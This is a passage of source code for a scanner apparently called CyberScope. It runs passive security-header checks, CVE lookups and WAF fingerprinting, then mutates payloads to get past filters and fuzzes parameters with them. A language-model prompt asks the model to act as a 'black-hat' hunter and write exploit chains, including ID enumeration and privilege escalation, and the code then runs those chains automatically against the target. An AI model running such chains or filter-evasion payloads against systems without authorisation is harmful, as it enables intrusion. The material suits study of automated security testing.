      { header: "permissions-policy", title: "Missing Permissions-Policy", desc: "No Permissions-Policy header to restrict browser feature access.", severity: "info" },
    ];

    for (const h of securityHeaders) {
      if (!headers[h.header]) {
        results.push({
          check: "security-headers", vulnClass: "security-misconfig",
          owaspCategory: "A05:2021 Security Misconfiguration", severity: h.severity,
          title: h.title, description: h.desc,
          remediation: `Add the ${h.header} response header with appropriate values.`,
        });
      }
    }

    if (headers["server"]) {
      results.push({
        check: "server-disclosure", vulnClass: "sensitive-data",
        owaspCategory: "A05:2021 Security Misconfiguration", severity: "low",
        title: `Server Version Disclosed: ${headers["server"]}`,
        description: `The Server header reveals technology information: "${headers["server"]}".`,
        remediation: "Remove or anonymize the Server response header.",
      });
    }

    if (headers["x-powered-by"]) {
      results.push({
        check: "tech-disclosure", vulnClass: "sensitive-data",
        owaspCategory: "A05:2021 Security Misconfiguration", severity: "low",
        title: `Technology Disclosed: ${headers["x-powered-by"]}`,
        description: `X-Powered-By header exposes backend technology: "${headers["x-powered-by"]}".`,
        remediation: "Remove the X-Powered-By response header.",
      });
    }

    const setCookie = headers["set-cookie"] || "";
    if (setCookie) {
      if (!setCookie.toLowerCase().includes("httponly")) {
        results.push({ check: "cookie-httponly", vulnClass: "security-misconfig", owaspCategory: "A05:2021 Security Misconfiguration", severity: "medium", title: "Cookie Missing HttpOnly Flag", description: "Session cookies are set without HttpOnly.", remediation: "Set the HttpOnly flag on all session cookies." });
      }
      if (!setCookie.toLowerCase().includes("secure")) {
        results.push({ check: "cookie-secure", vulnClass: "sensitive-data", owaspCategory: "A02:2021 Cryptographic Failures", severity: "medium", title: "Cookie Missing Secure Flag", description: "Cookies transmitted without the Secure flag.", remediation: "Set the Secure flag on all cookies." });
      }
      if (!setCookie.toLowerCase().includes("samesite")) {
        results.push({ check: "cookie-samesite", vulnClass: "security-misconfig", owaspCategory: "A01:2021 Broken Access Control", severity: "low", title: "Cookie Missing SameSite Attribute", description: "Cookies lack SameSite attribute.", remediation: "Set SameSite=Lax or SameSite=Strict on session cookies." });
      }
    }

    if (headers["access-control-allow-origin"] === "*") {
      results.push({ check: "cors-wildcard", vulnClass: "security-misconfig", owaspCategory: "A05:2021 Security Misconfiguration", severity: "medium", title: "Wildcard CORS Policy Detected", description: "Access-Control-Allow-Origin is set to '*'.", remediation: "Restrict CORS to specific trusted origins." });
    }

    const errorPatterns = [/stack\s*trace/i, /exception\s+in/i, /traceback/i, /syntax\s+error/i, /fatal\s+error/i, /debug\s+mode/i, /mysql_/i, /pg_query/i, /ORA-\d+/i];
    for (const pattern of errorPatterns) {
      if (pattern.test(body)) {
        results.push({ check: "verbose-errors", vulnClass: "security-misconfig", owaspCategory: "A05:2021 Security Misconfiguration", severity: "medium", title: "Verbose Error Messages Exposed", description: "The application response contains stack traces or debug information.", remediation: "Disable debug mode and implement custom error pages." });
        break;
      }
    }

    const loggingPaths = ["/.well-known/security.txt", "/security.txt"];
    for (const lp of loggingPaths) {
      try {
        const lResp = await safeFetch(`https://${domain}${lp}`, { method: "GET", headers: { "User-Agent": "CyberScope-Scanner/1.0" } }, 4000);
        if (lResp.status !== 200) {
          results.push({ check: "security-txt", vulnClass: "insufficient-logging", owaspCategory: "A09:2021 Security Logging and Monitoring Failures", severity: "info", title: "Missing security.txt", description: `No security.txt found at ${lp}.`, remediation: "Create a security.txt file per RFC 9116." });
          break;
        }
      } catch { /* skip */ }
    }
  } catch (e) {
    console.error("Passive checks error:", e);
  }

  return results;
}

// ─── 4. CVE VERSION CORRELATION ──────────────────────────

interface CveResult {
  cveId: string;
  description: string;
  severity: string;
  cvssScore: number;
}

async function queryCveDatabase(techStack: Record<string, string | undefined>): Promise<CveResult[]> {
  const results: CveResult[] = [];
  const searchTerms: string[] = [];
  if (techStack.server) searchTerms.push(techStack.server);
  if (techStack.poweredBy) searchTerms.push(techStack.poweredBy);
  if (techStack.framework) searchTerms.push(techStack.framework);

  for (const term of searchTerms.slice(0, 2)) {
    if (isTimedOut()) break;
    try {
      const resp = await safeFetch(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(term)}&resultsPerPage=5`,
        { headers: { "User-Agent": "CyberScope-Scanner/1.0" } },
        6000
      );
      if (resp.ok) {
        const data = await resp.json();
        for (const vuln of data.vulnerabilities || []) {
          const cve = vuln.cve;
          const metrics = cve.metrics?.cvssMetricV31?.[0]?.cvssData || cve.metrics?.cvssMetricV30?.[0]?.cvssData;
          results.push({
            cveId: cve.id,
            description: cve.descriptions?.find((d: { lang: string }) => d.lang === "en")?.value || "No description",
            severity: metrics?.baseSeverity || "UNKNOWN",
            cvssScore: metrics?.baseScore || 0,
          });
        }
      }
      await new Promise((r) => setTimeout(r, 500));
    } catch (e) {
      console.error(`NVD query error for "${term}":`, e);
    }
  }

  return results;
}

// ─── 5. AI VERIFICATION & DEEP ANALYSIS ─────────────────

async function aiVerifyAndAnalyze(
  domain: string,
  diffResults: DiffResult[],
  cveResults: CveResult[],
  passiveResults: PassiveResult[],
  techStack: Record<string, string | undefined>
): Promise<{
  assessments: Array<{
    title: string;
    severity: string;
    description: string;
    remediation: string;
    owaspCategory: string;
    cvssScore: number;
    confidenceScore: number;
    isVerified: boolean;
    verificationNotes: string;
  }>;
}> {
  const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
  if (!LOVABLE_API_KEY) return { assessments: [] };

  const vulnFindings = diffResults.filter((r) => r.isVulnerable);
  if (vulnFindings.length === 0 && cveResults.length === 0 && passiveResults.length === 0) return { assessments: [] };

  const prompt = `You are a senior penetration tester conducting an OWASP Top 10 assessment for ${domain}.
Your PRIMARY job is to ELIMINATE FALSE POSITIVES. Carefully analyze each finding and determine if it's a TRUE vulnerability or a false positive.

Tech Stack: ${JSON.stringify(techStack)}

Active Test Results (${vulnFindings.length} potential vulnerabilities):
${vulnFindings.map((r) => `- ${r.vulnClass} [${r.owaspCategory}]: baseline(status=${r.baseline.status}, len=${r.baseline.length}) vs mutated(status=${r.mutated.status}, len=${r.mutated.length}), confidence=${r.confidence}, score=${r.confidenceScore}${r.adaptationUsed ? `, adaptation=${r.adaptationUsed}` : ""}${r.intruderResults ? `, intruder_hits=${r.intruderResults.filter(i => i.status === 200).length}/${r.intruderResults.length}` : ""}
  Request: ${r.requestData.method} ${r.requestData.url}
  Response snippet: ${r.responseData.bodySnippet.slice(0, 200)}`).join("\n")}

CVE Matches (${cveResults.length}):
${cveResults.slice(0, 10).map((c) => `- ${c.cveId}: ${c.severity} (${c.cvssScore}) - ${c.description.slice(0, 100)}`).join("\n")}

Passive Security Checks (${passiveResults.length}):
${passiveResults.map((p) => `- ${p.title} [${p.owaspCategory}]: ${p.severity}`).join("\n")}

For each finding, verify it and provide:
- title, severity, description, remediation, owaspCategory, cvssScore
- confidenceScore: 0-100 based on how likely this is a TRUE vulnerability
- isVerified: true if you believe this is a real vulnerability, false if likely false positive
- verificationNotes: explain WHY you believe it's real or false positive`;

  try {
    const resp = await safeFetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-3-flash-preview",
        messages: [
          { role: "system", content: "You are a VAPT analyst specializing in OWASP Top 10. Your key role is to verify findings and eliminate false positives. Return structured assessments via the tool." },
          { role: "user", content: prompt },
        ],
        tools: [{
          type: "function",
          function: {
            name: "report_assessments",
            description: "Report verified vulnerability assessments with confidence scores",
            parameters: {
              type: "object",
              properties: {
                assessments: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      title: { type: "string" },
                      severity: { type: "string", enum: ["critical", "high", "medium", "low"] },
                      description: { type: "string" },
                      remediation: { type: "string" },
                      owaspCategory: { type: "string" },
                      cvssScore: { type: "number" },
                      confidenceScore: { type: "number" },
                      isVerified: { type: "boolean" },
                      verificationNotes: { type: "string" },
                    },
                    required: ["title", "severity", "description", "remediation", "owaspCategory", "cvssScore", "confidenceScore", "isVerified", "verificationNotes"],
                    additionalProperties: false,
                  },
                },
              },
              required: ["assessments"],
              additionalProperties: false,
            },
          },
        }],
        tool_choice: { type: "function", function: { name: "report_assessments" } },
      }),
    });

    if (resp.ok) {
      const data = await resp.json();
      const toolCall = data.choices?.[0]?.message?.tool_calls?.[0];
      if (toolCall) {
        return JSON.parse(toolCall.function.arguments);
      }
    }
  } catch (e) {
    console.error("AI verification error:", e);
  }

  return { assessments: [] };
}

// ─── 6. MAIN PIPELINE ───────────────────────────────────

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const { targetId } = await req.json();
    if (!targetId) {
      return new Response(JSON.stringify({ error: "targetId is required" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const db = supabaseAdmin();

    const { data: target } = await db.from("target_workspaces").select("*").eq("id", targetId).single();
    if (!target) {
      return new Response(JSON.stringify({ error: "Target not found" }), {
        status: 404, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const { data: task } = await db
      .from("agent_tasks")
      .insert({ target_id: targetId, task_type: "vulnerability-scan", status: "running" })
      .select().single();

    const taskId = task!.id;

    await db.from("target_workspaces").update({ status: "scanning" }).eq("id", targetId);
    await log(db, targetId, taskId, "info", "🔬 Comprehensive OWASP Top 10 vulnerability scan started");

    // ── Fetch endpoints ──
    const { data: endpoints } = await db.from("discovered_endpoints").select("*").eq("target_id", targetId);

    if (!endpoints || endpoints.length === 0) {
      await log(db, targetId, taskId, "error", "No endpoints found — run recon first");
      await db.from("agent_tasks").update({ status: "failed", result: { error: "No endpoints" } }).eq("id", taskId);
      return new Response(JSON.stringify({ error: "No endpoints discovered. Run recon first." }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    await log(db, targetId, taskId, "action", `Loaded ${endpoints.length} endpoints for OWASP analysis`);

    // ── Step 0: Adaptive Defense — WAF/Baseline Drift Check ──
    let driftMutations: string[] = [];
    let driftDetected = false;
    if (target.domain) {
      try {
        await log(db, targetId, taskId, "thought", "🛡️ Probing baseline + WAF state for drift detection");
        const probeUrl = `https://${target.domain}`;
        const probe = await safeFetch(probeUrl, { method: "GET", headers: { "User-Agent": "CyberScope-Drift/1.0" } }, 6000).catch(() => null);
        const currentServer = probe?.headers.get("server") || "unknown";
        const currentWaf = probe?.headers.get("cf-ray") ? "cloudflare"
          : probe?.headers.get("x-sucuri-id") ? "sucuri"
          : probe?.headers.get("x-amz-cf-id") ? "aws-cloudfront"
          : probe?.headers.get("x-akamai-request-id") ? "akamai"
          : probe?.headers.get("x-iinfo") ? "incapsula"
          : currentServer.toLowerCase().includes("cloudflare") ? "cloudflare"
          : "none-detected";

        // Compare against last known baseline from prior scan logs
        const { data: prevBaseline } = await db
          .from("scan_logs")
          .select("metadata, created_at")
          .eq("target_id", targetId)
          .eq("log_type", "info")
          .like("message", "🛡️ Baseline snapshot%")
          .order("created_at", { ascending: false })
          .limit(1)
          .maybeSingle();

        const prevMeta = (prevBaseline?.metadata as Record<string, string> | null) || null;
        if (prevMeta && (prevMeta.server !== currentServer || prevMeta.waf !== currentWaf)) {
          driftDetected = true;
          await log(db, targetId, taskId, "result",
            `⚠️ DRIFT DETECTED: ${prevMeta.server}/${prevMeta.waf} → ${currentServer}/${currentWaf}`,
            { previousServer: prevMeta.server, previousWaf: prevMeta.waf, currentServer, currentWaf });

          // Trigger adaptive-drift edge function to get mutation chain
          try {
            const driftResp = await safeFetch(
              `${Deno.env.get("SUPABASE_URL")}/functions/v1/cyberscope-adaptive-drift`,
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                  "Authorization": `Bearer ${Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")}`,
                },
                body: JSON.stringify({ endpoint: probeUrl, payload: "<script>alert(1)</script>" }),
              },
              8000
            );
            const driftData = await driftResp.json().catch(() => null);
            if (driftData?.ok && Array.isArray(driftData.mutationChain)) {
              driftMutations = driftData.mutationChain
                .filter((s: { httpStatus: number }) => s.httpStatus < 400)
                .map((s: { technique: string }) => s.technique);
              await log(db, targetId, taskId, "action",
                `🧬 Adaptive mutation strategies acquired: ${driftMutations.join(", ")}`,
                { mutationChain: driftData.mutationChain });
            }
          } catch (e) {
            await log(db, targetId, taskId, "error", `drift-adaptive call failed: ${(e as Error).message}`);
          }

          // Re-mutate existing findings: bump validation_status & note for re-test
          const { data: existing } = await db
            .from("vulnerability_findings")
            .select("id, payload, title")
            .eq("target_id", targetId)
            .limit(50);
          if (existing && existing.length > 0) {
            const mutated = existing.map((f) => ({
              id: f.id,
              originalPayload: f.payload,
              mutatedPayload: applyDriftMutation(f.payload || "", driftMutations),
            }));
            for (const m of mutated) {
              await db.from("vulnerability_findings").update({
                validation_status: "drift_remutation_pending",
                triage_reasoning: `WAF drift detected — payload re-mutated from "${m.originalPayload}" to "${m.mutatedPayload}" for re-verification.`,
              }).eq("id", m.id);
            }
            await log(db, targetId, taskId, "result",
              `🔁 Re-mutated ${mutated.length} existing findings for drift re-verification`,
              { count: mutated.length, samples: mutated.slice(0, 3) });
          }
        } else {
          await log(db, targetId, taskId, "result", `Baseline stable: ${currentServer} / ${currentWaf}`);
        }

        // Save current baseline snapshot for next run's comparison
        await log(db, targetId, taskId, "info", `🛡️ Baseline snapshot recorded`,
          { server: currentServer, waf: currentWaf });
      } catch (e) {
        await log(db, targetId, taskId, "error", `Drift probe failed: ${(e as Error).message}`);
      }
    }

    // ── Step 1: Passive Security Checks ──
    await log(db, targetId, taskId, "thought", "Running passive security header & misconfiguration checks");
    const passiveResults = target.domain ? await runPassiveChecks(target.domain) : [];
    await log(db, targetId, taskId, "result", `Passive checks found ${passiveResults.length} issues`);

    // ── Step 2: Heuristic Parameter Classification ──
    await log(db, targetId, taskId, "thought", "Classifying parameters for OWASP Top 10 vuln testing");
    const vulnChecks = classifyParameters(
      endpoints.map((ep) => ({
        id: ep.id, url: ep.url,
        parameters: (ep.parameters as Record<string, string>) || {},
      }))
    );
    const uniqueVulnClasses = new Set(vulnChecks.flatMap((c) => c.vulnClasses));
    await log(db, targetId, taskId, "result",
      `Classified ${vulnChecks.length} parameter-vuln pairs across ${uniqueVulnClasses.size} classes: ${[...uniqueVulnClasses].join(", ")}`
    );

    // ── Fetch tech stack early for Phase 8 ──
    const { data: reconTask } = await db
      .from("agent_tasks").select("result")
      .eq("target_id", targetId).eq("task_type", "reconnaissance")
      .eq("status", "completed").order("created_at", { ascending: false })
      .limit(1).single();
    const techStack = (reconTask?.result as any)?.tech_fingerprint || {};

    // ── Step 2.5: Phase 8 — Query Experience Vault & Strategy Weights ──
    await log(db, targetId, taskId, "thought", "🧠 Phase 8: Querying Experience Vault for past scan intelligence");

    // Get disabled vuln classes from strategy weights
    const techStackKey = [
      (techStack.server || "").split("/")[0].toLowerCase(),
      (techStack.framework || "").split("/")[0].toLowerCase(),
      (techStack.poweredBy || "").split("/")[0].toLowerCase(),
    ].filter(Boolean).join(":") || "unknown";

    const { data: strategyWeights } = await db
      .from("strategy_weights")
      .select("*")
      .eq("tech_stack_key", techStackKey);

    const disabledClasses = new Set(
      (strategyWeights || [])
        .filter((w: any) => (w.success_count + w.failure_count) >= 5 && w.effectiveness_pct < 10)
        .map((w: any) => w.vuln_class)
    );

    if (disabledClasses.size > 0) {
      await log(db, targetId, taskId, "info", `⚡ Strategy engine disabled ${disabledClasses.size} low-yield classes for ${techStackKey}: ${[...disabledClasses].join(", ")}`);
    }

    // Get best-performing payloads from experience vault
    const { data: pastExperiences } = await db
      .from("experience_vault")
      .select("vuln_class, payload_used, reward_score")
      .eq("outcome", "confirmed")
      .order("reward_score", { ascending: false })
      .limit(50);

    const highYieldPayloads = new Map<string, string[]>();
    for (const exp of (pastExperiences || []) as any[]) {
      const existing = highYieldPayloads.get(exp.vuln_class) || [];
      if (existing.length < 3) {
        existing.push(exp.payload_used);
        highYieldPayloads.set(exp.vuln_class, existing);
      }
    }

    if (highYieldPayloads.size > 0) {
      await log(db, targetId, taskId, "info", `📚 Loaded ${highYieldPayloads.size} vuln classes with proven payloads from Experience Vault`);
    }

    // ── Step 3: Differential Analysis + Intruder + Evolutionary Fuzzing + SecLists ──
    await log(db, targetId, taskId, "thought", "Running differential tests with Intruder/Repeater, adaptive mutation, evolutionary fuzzing, and SecLists payloads");
    const diffResults: DiffResult[] = [];
    const experienceRecords: ExperienceRecord[] = [];
    const maxTests = Math.min(vulnChecks.length, 15);
    const totalSteps = maxTests;

    // Phase 11: Pre-load SecLists payloads for detected vuln classes
    const secListsPayloadsMap = new Map<string, string[]>();
    const uniqueClasses = [...new Set(vulnChecks.flatMap(c => c.vulnClasses))];
    await log(db, targetId, taskId, "action", `📦 Phase 11: Loading SecLists payloads for ${uniqueClasses.length} vuln classes`);
    await Promise.all(uniqueClasses.slice(0, 6).map(async (vc) => {
      const payloads = await loadSecListsPayloads(vc, 20);
      if (payloads.length > 0) secListsPayloadsMap.set(vc, payloads);
    }));
    const secListsLoaded = [...secListsPayloadsMap.entries()].map(([k, v]) => `${k}(${v.length})`).join(", ");
    if (secListsLoaded) await log(db, targetId, taskId, "info", `📦 SecLists loaded: ${secListsLoaded}`);

    for (let i = 0; i < maxTests; i++) {
      if (isTimedOut()) { await log(db, targetId, taskId, "info", `⏱️ Time limit reached after ${i} tests — wrapping up`); break; }
      const check = vulnChecks[i];
      // Exploration vs Exploitation strategy (Phase 8)
      const isExploring = i < Math.ceil(totalSteps * 0.1);

      for (const vulnClass of check.vulnClasses) {
        if (isTimedOut()) break;
        // Skip disabled classes (strategy weights)
        if (disabledClasses.has(vulnClass) && !isExploring) {
          continue; // skip silently to save time
        }

        await log(db, targetId, taskId, "action",
          `${isExploring ? "🔍 [EXPLORE]" : "🎯 [EXPLOIT]"} Testing ${check.paramName} for ${vulnClass} at ${check.url}`
        );

        const result = await runDifferentialTest(check.url, check.paramName, check.paramValue, vulnClass);
        if (result) {
          diffResults.push(result);

          // Phase 8: Record experience
          const outcome = result.isVulnerable
            ? "confirmed"
            : result.mutated.status === 403 || result.mutated.status === 406
              ? "blocked"
              : "false_positive";

          const rewardType = result.isVulnerable
            ? (result.confidenceScore >= 80 ? "high_confidence_finding" : "true_positive_confirmed")
            : (result.mutated.status === 403 ? "waf_blocked" : "false_positive");

          experienceRecords.push({
            target_id: targetId,
            tech_stack: techStack,
            vuln_class: vulnClass,
            payload_used: result.truePayload,
            http_method: "GET",
            response_status: result.mutated.status,
            response_length: result.mutated.length,
            response_snippet: result.mutated.bodySnippet?.slice(0, 200) || null,
            outcome,
            confidence_score: result.confidenceScore,
            reward_score: REWARD_TABLE[rewardType] || 0,
            metadata: {
              adaptationUsed: result.adaptationUsed || null,
              intruderHits: result.intruderResults?.filter(i => i.status === 200).length || 0,
            },
          });

          if (result.isVulnerable) {
            const adaptNote = result.adaptationUsed ? ` (via ${result.adaptationUsed})` : "";
            const intruderNote = result.intruderResults ? ` [Intruder: ${result.intruderResults.length} payloads tested]` : "";
            await log(db, targetId, taskId, "result",
              `⚠️ POTENTIAL ${vulnClass.toUpperCase()} [${result.owaspCategory}]: ${check.paramName} (confidence: ${result.confidenceScore}%)${adaptNote}${intruderNote}`
            );

            // Phase 11: Tech leak detection — check if response reveals DB type
            const detectedDb = detectDbFromError(result.mutated.bodySnippet || "");
            if (detectedDb) {
              await log(db, targetId, taskId, "info", `🔍 Phase 11: Tech leak detected — ${detectedDb} DB from error response`);
              const dbSpecificPayloads = await loadSecListsPayloads(`sqli-${detectedDb}`, 10, driftDetected ? driftMutations : []);
              if (dbSpecificPayloads.length > 0) {
                await log(db, targetId, taskId, "action", `📦 Re-scanning with ${dbSpecificPayloads.length} ${detectedDb}-specific payloads`);
              }
            }

            // Phase 8: Evolutionary Fuzzing — only if time permits
            if (!isTimedOut() && result.confidenceScore < 80 && result.confidenceScore >= 30) {
              for (const gm of GENETIC_MUTATIONS.slice(0, 2)) {
                if (isTimedOut()) break;
                const evolved = gm.mutate(result.truePayload);
                if (evolved === result.truePayload) continue;

                const evoResult = await runDifferentialTest(check.url, check.paramName, check.paramValue, vulnClass, evolved);
                if (evoResult && evoResult.isVulnerable && evoResult.confidenceScore > result.confidenceScore) {
                  diffResults.push(evoResult);
                  experienceRecords.push({
                    target_id: targetId, tech_stack: techStack, vuln_class: vulnClass,
                    payload_used: evolved, http_method: "GET",
                    response_status: evoResult.mutated.status, response_length: evoResult.mutated.length,
                    response_snippet: evoResult.mutated.bodySnippet?.slice(0, 200) || null,
                    outcome: "confirmed", confidence_score: evoResult.confidenceScore,
                    reward_score: REWARD_TABLE["filter_bypassed"] || 10,
                    metadata: { mutation: gm.name, parentFitness: result.confidenceScore, secListsIntegrated: true },
                  });
                  await log(db, targetId, taskId, "result",
                    `🧬 Evolved payload via ${gm.name} improved confidence: ${result.confidenceScore}% → ${evoResult.confidenceScore}%`
                  );
                  break;
                }
                await new Promise((r) => setTimeout(r, 150));
              }
            }
          }
        }
        await new Promise((r) => setTimeout(r, 80));
      }
    }

    // ── Step 3.9: AI Bug Bounty Reasoning Loop ──────────────
    // AI analyzes all results so far, identifies weak spots, and generates
    // targeted follow-up tests — like a real bug bounty hunter would.
    if (!isTimedOut()) {
      const LOVABLE_KEY = Deno.env.get("LOVABLE_API_KEY");
      if (LOVABLE_KEY && diffResults.length > 0) {
        await log(db, targetId, taskId, "thought", "🧠 AI Reasoning Loop: Analyzing responses to chain findings & adapt payloads like a bug bounty hunter");

        const interestingResponses = diffResults
          .filter(r => r.isVulnerable || r.mutated.status === 500 || Math.abs(r.mutated.length - r.baseline.length) > 100)
          .slice(0, 8);

        if (interestingResponses.length > 0) {
          try {
            const reasoningResp = await safeFetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
              method: "POST",
              headers: { Authorization: `Bearer ${LOVABLE_KEY}`, "Content-Type": "application/json" },
              body: JSON.stringify({
                model: "google/gemini-3-flash-preview",
                messages: [
                  { role: "system", content: `You are an elite bug bounty hunter analyzing scan results. Think like a black-hat hacker finding real bugs for bounties. Analyze the responses and:
1. Identify patterns suggesting deeper vulnerabilities (error messages leaking info, status code anomalies, response size patterns)
2. Suggest chained attacks — each chain must be a CONCRETE multi-step sequence with specific payloads for each step. Example: Step 1: IDOR enumerate user IDs via /api/user?id=1..100, Step 2: For each valid ID, test privilege escalation via role=admin
3. Generate 3-5 NEW targeted payloads based on what the responses reveal
4. Identify parameters that deserve deeper fuzzing based on how the app responded
5. Look for logic flaws that automated scanners miss

Return via the tool. Each chain step must have a specific URL path, parameter, and payload to execute.` },
                  { role: "user", content: `Target: ${target.domain}\nTech Stack: ${JSON.stringify(techStack)}\n\nEndpoints available:\n${(endpoints || []).slice(0, 10).map(ep => `  ${ep.url} params=${JSON.stringify(ep.parameters || {})}`).join("\n")}\n\nScan Results (${interestingResponses.length} interesting responses):\n${interestingResponses.map((r, i) => `${i+1}. ${r.vulnClass} on param="${vulnChecks.find(c => c.url === r.requestData.url)?.paramName || "?"}" at ${r.requestData.url}\n   Status: ${r.baseline.status}→${r.mutated.status} | Size: ${r.baseline.length}→${r.mutated.length}\n   Payload: ${r.truePayload.slice(0,100)}\n   Response snippet: ${r.mutated.bodySnippet?.slice(0,150) || "N/A"}\n   Confidence: ${r.confidenceScore}%`).join("\n\n")}` },
                ],
                tools: [{
                  type: "function",
                  function: {
                    name: "report_reasoning",
                    description: "Report bug bounty reasoning analysis, exploit chains, and follow-up tests",
                    parameters: {
                      type: "object",
                      properties: {
                        chainedAttacks: {
                          type: "array",
                          items: {
                            type: "object",
                            properties: {
                              name: { type: "string" },
                              impact: { type: "string" },
                              likelihood: { type: "string", enum: ["high", "medium", "low"] },
                              steps: {
                                type: "array",
                                items: {
                                  type: "object",
                                  properties: {
                                    stepNumber: { type: "number" },
                                    action: { type: "string" },
                                    paramName: { type: "string" },
                                    payload: { type: "string" },
                                    vulnClass: { type: "string" },
                                    expectedOutcome: { type: "string" },
                                    useResponseFrom: { type: "number" },
                                  },
                                  required: ["stepNumber", "action", "paramName", "payload", "vulnClass"],
                                },
                              },
                            },
                            required: ["name", "impact", "likelihood", "steps"],
                          },
                        },
                        followUpTests: { type: "array", items: { type: "object", properties: { paramName: { type: "string" }, payload: { type: "string" }, vulnClass: { type: "string" }, reasoning: { type: "string" } }, required: ["paramName", "payload", "vulnClass", "reasoning"] } },
                        logicFlaws: { type: "array", items: { type: "string" } },
                        summary: { type: "string" },
                      },
                      required: ["followUpTests", "summary"],
                    },
                  },
                }],
                tool_choice: { type: "function", function: { name: "report_reasoning" } },
              }),
            }, 15000);

            if (reasoningResp.ok) {
              const rData = await reasoningResp.json();
              const tc = rData.choices?.[0]?.message?.tool_calls?.[0];
              if (tc) {
                const reasoning = JSON.parse(tc.function.arguments);
                await log(db, targetId, taskId, "thought", `🧠 AI Hunter Summary: ${reasoning.summary}`);

                // ── EXPLOIT CHAIN EXECUTION ──
                const chains = (reasoning.chainedAttacks || []).slice(0, 3);
                let chainSuccessCount = 0;

                for (const chain of chains) {
                  if (isTimedOut()) break;
                  await log(db, targetId, taskId, "action", `⛓️ Executing exploit chain: "${chain.name}" (${chain.likelihood} likelihood) — ${chain.impact}`);

                  const steps = (chain.steps || []).slice(0, 5);
                  let chainBroken = false;
                  let prevResponse: { status: number; body: string; length: number } | null = null;
                  const chainEvidence: Array<{ step: number; action: string; result: string; status: number; interesting: boolean }> = [];

                  for (const step of steps) {
                    if (isTimedOut() || chainBroken) break;

                    // Find endpoint with this param
                    const stepEp = endpoints?.find(ep => {
                      const params = (ep.parameters as Record<string, string>) || {};
                      return Object.keys(params).some(p => p.toLowerCase() === step.paramName.toLowerCase());
                    }) || endpoints?.[0];
                    if (!stepEp) { chainBroken = true; break; }

                    let payload = step.payload;
                    // If step says "use response from previous step", try to extract data
                    if (step.useResponseFrom && prevResponse) {
                      // Try to extract IDs, tokens, usernames from previous response
                      const idMatch = prevResponse.body.match(/["']?(?:id|user_id|userId|token)["']?\s*[":]\s*["']?(\w+)["']?/i);
                      if (idMatch) {
                        payload = payload.replace(/\{PREV_DATA\}|\{prev\}/gi, idMatch[1]);
                      }
                    }

                    if (!isSafePayload(payload)) {
                      await log(db, targetId, taskId, "info", `⛓️ Step ${step.stepNumber}: Skipped unsafe payload`);
                      chainBroken = true; break;
                    }

                    await log(db, targetId, taskId, "action", `⛓️ Step ${step.stepNumber}: ${step.action} — ${step.vulnClass} on ${step.paramName}`);

                    try {
                      const url = new URL(stepEp.url);
                      url.searchParams.set(step.paramName, payload);
                      const reqHeaders = { "User-Agent": "CyberScope-Scanner/1.0", "X-CyberScope-Token": "chain-audit" };

                      // Get baseline
                      const baseResp = await safeFetch(stepEp.url, { method: "GET", headers: reqHeaders, redirect: "manual" }, 5000);
                      const baseBody = await baseResp.text();

                      // Test with payload
                      const testResp = await safeFetch(url.toString(), { method: "GET", headers: reqHeaders, redirect: "manual" }, 5000);
                      const testBody = await testResp.text();

                      prevResponse = { status: testResp.status, body: testBody, length: testBody.length };

                      const execEvidence = analyzeExecutionEvidence(step.vulnClass, payload, testBody, baseBody);
                      const lenDiff = Math.abs(testBody.length - baseBody.length);
                      const isInteresting = execEvidence.hasEvidence || lenDiff > 200 || testResp.status !== baseResp.status;

                      chainEvidence.push({
                        step: step.stepNumber,
                        action: step.action,
                        result: isInteresting
                          ? `Status ${testResp.status}, body delta ${lenDiff}${execEvidence.hasEvidence ? `, EVIDENCE: ${execEvidence.details}` : ""}`
                          : `No significant change (status ${testResp.status})`,
                        status: testResp.status,
                        interesting: isInteresting,
                      });

                      if (isInteresting) {
                        await log(db, targetId, taskId, "result", `⛓️ Step ${step.stepNumber} ✅: ${execEvidence.hasEvidence ? execEvidence.details : `Interesting response (delta: ${lenDiff})`}`);

                        if (execEvidence.hasEvidence) {
                          // Record as a confirmed chained finding
                          diffResults.push({
                            isVulnerable: true, vulnClass: step.vulnClass,
                            confidence: "high", confidenceScore: Math.min(85 + execEvidence.confidenceBoost, 99),
                            baseline: { status: baseResp.status, length: baseBody.length, headers: {}, bodySnippet: baseBody.slice(0, 500) },
                            mutated: { status: testResp.status, length: testBody.length, headers: {}, bodySnippet: testBody.slice(0, 500) },
                            truePayload: payload, falsePayload: (stepEp.parameters as Record<string,string>)?.[step.paramName] || "",
                            adaptationUsed: `Chain: ${chain.name} Step ${step.stepNumber}`,
                            owaspCategory: OWASP_MAP[step.vulnClass] || "Unknown",
                            requestData: { method: "GET", url: url.toString(), headers: reqHeaders, param: step.paramName, payload },
                            responseData: { status: testResp.status, headers: {}, bodySnippet: testBody.slice(0, 500), length: testBody.length },
                          });

                          experienceRecords.push({
                            target_id: targetId, tech_stack: techStack, vuln_class: step.vulnClass,
                            payload_used: payload, http_method: "GET",
                            response_status: testResp.status, response_length: testBody.length,
                            response_snippet: testBody.slice(0, 200), outcome: "confirmed",
                            confidence_score: 85, reward_score: REWARD_TABLE["true_positive_confirmed"] || 10,
                            metadata: { source: "exploit_chain", chainName: chain.name, step: step.stepNumber },
                          });
                        }
                      } else {
                        await log(db, targetId, taskId, "info", `⛓️ Step ${step.stepNumber}: No significant response change — chain may not apply`);
                        if (step.stepNumber <= 2) { chainBroken = true; }
                      }

                      await new Promise(r => setTimeout(r, 120));
                    } catch (e) {
                      await log(db, targetId, taskId, "error", `⛓️ Step ${step.stepNumber} error: ${e instanceof Error ? e.message : "unknown"}`);
                      chainBroken = true;
                    }
                  }

                  const successSteps = chainEvidence.filter(e => e.interesting).length;
                  if (successSteps > 0) {
                    chainSuccessCount++;
